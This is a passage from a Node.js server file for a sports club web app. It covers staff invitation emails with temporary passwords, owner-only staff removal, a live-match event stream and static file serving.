            from: `"Aagaz Sports Club" <${process.env.EMAIL_USER}>`,
            to: input.email.trim(),
            subject: `You're invited to join Aagaz Sports Club as ${input.role.replace(/_/g, ' ')}`,
            html: `
              <div style="font-family: sans-serif; padding: 20px; max-width: 560px;">
                <h2>Welcome to Aagaz Sports Club, ${input.name.trim()}! 🎉</h2>
                <p>You have been added as a <strong>${input.role.replace(/_/g, ' ')}</strong>.</p>
                <p>Use the following credentials to log in for the first time:</p>
                <p><strong>Email:</strong> ${input.email.trim()}</p>
                <p><strong>Temporary Password:</strong> <code style="background:#f0f0f0;padding:4px 8px;border-radius:4px;">${tempPassword}</code></p>
                <p>Please change your password after logging in.</p>
                <a href="${inviteLink}" style="display:inline-block;background:#006c86;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;margin-top:10px;">Login to Dashboard →</a>
              </div>
            `
          });
        }
      } catch (err) {
        console.error("Failed to send invite email:", err);
      }
      return send(res, 201, { message: `Staff account created for ${input.name.trim()}. An invite email has been sent.`, inviteLink, tempPassword });
    }
    if (pathname.match(/^\/api\/admin\/staff\/[^/]+$/) && req.method === 'DELETE') {
      if (!await isOwnerAdmin(req)) return send(res, 403, { error: 'Only the club owner can remove staff.' });
      const staffId = pathname.split('/')[4];
      const data = await readData();
      const idx = data.staffUsers.findIndex(s => s.id === staffId && s.role !== 'super_admin');
      if (idx === -1) return send(res, 404, { error: 'Staff member not found or cannot be removed.' });
      data.staffUsers.splice(idx, 1);
      await writeData(data);
      return send(res, 200, { message: 'Staff member removed.' });
    }

    if (pathname === '/api/stream/live' && req.method === 'GET') { res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive' }); const data = await readData(); res.write(`data: ${JSON.stringify(data.liveMatches)}\n\n`); sseClients.add(res); req.on('close', () => sseClients.delete(res)); return; }
    if (req.method === 'GET') {
      const clientPath = pathname === '/' ? '/index.html' : pathname;
      const filePath = path.resolve(CLIENT_ROOT, `.${clientPath}`);
      if (!filePath.startsWith(CLIENT_ROOT) || !fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) return send(res, 404, 'Not found', 'text/plain');
      const ext = path.extname(filePath);
      const mime = ext === '.html' ? 'text/html' : ext === '.js' ? 'application/javascript' : ext === '.css' ? 'text/css' : ext === '.svg' ? 'image/svg+xml' : 'application/octet-stream';
      return send(res, 200, fs.readFileSync(filePath), mime);
    }
    return send(res, 405, { error: 'Method not allowed.' });
  } catch (error) { console.error(error); return send(res, 500, { error: 'Something went wrong. Please try again.' }); }
}

module.exports = handleRequest;

if (require.main === module) {
  const server = http.createServer(handleRequest);
  server.listen(PORT, () => console.log(`Aagaz Sports Club running at http://localhost:${PORT}`));
}
